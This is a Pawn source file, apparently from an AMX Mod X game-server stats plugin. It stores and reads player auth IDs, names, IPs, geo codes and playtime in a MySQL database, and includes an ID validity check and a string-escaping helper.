insert_user_info_batch(sql[], sAuthId[MAX_AUTHID_LENGTH] = "", sName[MAX_NAME_LENGTH] = "")
{
	new len = 0;
	new sIp	[MAX_IP_LENGTH]	= "";
	new sGeo[3]				= "";
	new playtime = select_user_info_record(sAuthId, sIp, sGeo);

	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_USER);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_USER, sAuthId, sName, sIp, sGeo, playtime);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}

select_user_info(sAuthId[])
{
	if (!g_dbConnect)
		return 0;

	new sql[512];
	formatex(sql, charsmax(sql), SQL_SELECT_USER_TIME, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER], sAuthId);
	new Handle:query = SQL_PrepareQuery(g_dbConnect, sql);
	
	// run the query
	if(!SQL_Execute(query))
	{
		// if there were any problems
		SQL_QueryError(query,g_dbError, charsmax(g_dbError));
		set_fail_state(g_dbError);
    }

	new online = 0;	
	if (SQL_NumResults(query) > 0)
	{
		// checks to make sure there's more results
		// notice that it starts at the first row, rather than null
		online = SQL_ReadResult(query, 0);
	}
	// of course, free the handle
	SQL_FreeHandle(query);
	
	return online;
}

select_user_info_record(sAuthId[MAX_AUTHID_LENGTH], ip[MAX_IP_LENGTH], geo[3])
{
	new Handle:query = SQL_PrepareQuery(g_dbConnect, SQL_SELECT_USER_INFO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER], sAuthId);
	
	// run the query
	if(!SQL_Execute(query))
	{
		// if there were any problems
		SQL_QueryError(query,g_dbError, charsmax(g_dbError));
		set_fail_state(g_dbError);
    }

	new online_time = 0;
	if (SQL_NumResults(query) > 0)
	{
		// SQL_ReadResult(query, 0, sAuthId, charsmax(sAuthId));	// auth_id
		SQL_ReadResult(query, 1, ip, charsmax(ip));		// ip
		SQL_ReadResult(query, 2, geo, charsmax(geo));	// geo code
		online_time = SQL_ReadResult(query, 3);			// time
	}

	// of course, free the handle
	SQL_FreeHandle(query);	
	return online_time;
}

bool:is_stats_all_zero(izStats[STATSX_MAX_STATS])
{
	for(new i = 0; i < STATSX_MAX_STATS; i++)
	{
		if (izStats[i] != 0)
			return false;
	}
	return true;
}

bool:is_valid_authid(sAuthid[])
{
	if (equali(sAuthid, "STEAM_ID_PENDING") 
	||	equali(sAuthid, "STEAM_ID_LAN")
	||	equali(sAuthid, "HLTV") 
	||	equali(sAuthid, "4294967295")
	||	equali(sAuthid, "VALVE_ID_LAN")
	||	equali(sAuthid, "VALVE_ID_PENDING"))
		return false;
	return true;
}

execute_insert_sql(sql[])
{
	if (!g_dbConnect)
		return;

	new Handle:result[1];
	result[0] = SQL_PrepareQuery(g_dbConnect, sql);
	execute_insert_multi_query(result, 1);
}

execute_insert_multi_query(Handle:query[], count)
{
	if (!g_dbConnect)
		return;

	for(new i = 0; i < count;i++)
	{
		if(!SQL_Execute(query[i]))
		{
			// if there were any problems
			SQL_QueryError(query[i], g_dbError, charsmax(g_dbError));
			set_fail_state(g_dbError);
		}
		SQL_FreeHandle(query[i]);
	}
}

stock mysql_escape_string(dest[],len)
{
    //copy(dest, len, source);
    replace_all(dest,len,"\\","\\\\");
    replace_all(dest,len,"\0","\\0");
    replace_all(dest,len,"\n","\\n");
    replace_all(dest,len,"\r","\\r");
    replace_all(dest,len,"\x1a","\Z");
    replace_all(dest,len,"'","\'");
    replace_all(dest,len,"^"","\^"");
} 